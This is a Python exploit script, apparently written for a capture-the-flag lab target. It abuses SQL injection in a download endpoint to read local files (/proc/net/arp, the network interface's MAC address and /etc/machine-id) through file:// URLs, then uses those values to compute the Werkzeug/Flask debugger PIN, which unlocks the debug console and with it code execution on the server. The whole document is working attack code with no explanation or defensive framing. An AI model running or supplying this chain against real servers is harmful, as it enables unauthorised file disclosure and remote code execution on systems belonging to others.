
import requests 
import sys
import re
import hashlib
from itertools import chain

print("    _____________      __    __ __\n   / ____/ /__  /_____/ /_  / // /\n  / /_  / / /_ </ ___/ __ \/ // /_\n / __/ / /___/ / /__/ / / /__  __/\n/_/   /_//____/\___/_/ /_/  /_/   \n")
   

base_url = "http://" + sys.argv[1] + ":8000/download?id="

url1 = base_url + "'union select \"file:///proc/net/arp\" -- -"
r1 = requests.get(url1)

print("Interface:\n" + r1.text)
interface = re.findall("e.*$",r1.text)

url2 = base_url + "' union select \"file:///sys/class/net/" + interface[0] + "/address\"-- -"
r2 = requests.get(url2)

mac = r2.text.strip()
print("MAC Address:" + mac)

clean_mac = mac.replace(":","")
uuidNode = str(int(clean_mac, 16))
print("UUID Node:" + uuidNode)

url3 = base_url + "' union select \"file:///etc/machine-id\"-- -"
r3 = requests.get(url3)
machineId = r3.text
print("Machine ID: " + machineId)



probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

machineId = machineId[:len(machineId)-1]

private_bits = [
    #UUID Node
    uuidNode,
    #Machine ID
    machineId
]

#print(len('aee6189caee449718070b58132f2e4ba'))
#print(len(machineId))

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print("Pin: " + rv)
